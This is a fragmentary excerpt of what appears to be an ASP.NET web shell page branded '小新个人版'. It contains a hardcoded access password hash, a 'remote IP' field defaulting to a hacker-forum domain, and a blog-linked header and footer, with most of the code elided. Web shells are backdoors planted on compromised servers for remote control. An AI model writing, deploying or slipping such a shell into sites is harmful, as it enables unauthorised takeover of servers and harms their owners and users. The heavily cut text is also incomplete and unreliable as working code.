...
<script runat="server">
public string Password="5854b7d51176229708197a5334ba1195";//zladmin
...
<tr class="head">
<td ><span style="float:right;"><a href="http://w3badmin.blog.163.com" target="_blank">小新个人版</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<td style="width:20%" align="left">远程Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="Bbs.Cn-Hacker.coM"/></td>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#003300;">Copyright &copy; 2012-2013 <a href="http://w3badmin.blog.163.com" target="_blank">My Blog</a> All Rights Reserved.</div></div>
</form>
</body>
</html>